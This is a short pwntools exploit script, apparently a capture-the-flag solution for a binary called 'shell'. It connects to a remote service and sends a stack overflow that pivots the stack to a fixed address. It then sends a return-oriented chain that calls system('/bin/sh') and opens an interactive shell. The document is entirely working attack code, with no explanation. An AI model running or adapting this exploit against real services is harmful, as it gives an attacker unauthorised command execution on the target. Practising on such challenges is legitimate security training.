from pwn import *

context.endian = 'little'
context.os = 'linux'
context.arch = 'amd64'
# context.log_level = 'debug'
# io = remote('node4.anna.nssctf.cn', 28783)
# io = process('./shell')
io = remote("192.168.170.128", 1234)
elf = ELF('shell')

io.recvuntil(b'zltt lost his shell, can you find it?\n')
fake_addr = 0x601a00
pop_rsi_r15_ret = 0x004005e1
pop_rdi_ret = 0x004005e3
ret = 0x00400481

payload = b'a' * 0x10 + p64(fake_addr) + p64(pop_rsi_r15_ret) + p64(fake_addr) + p64(0) + p64(0x00400572)
io.send(payload)

payload = b'/bin/sh\x00' + p64(pop_rdi_ret) + p64(fake_addr) + p64(ret) + p64(elf.sym['system'])
io.send(payload)

io.interactive()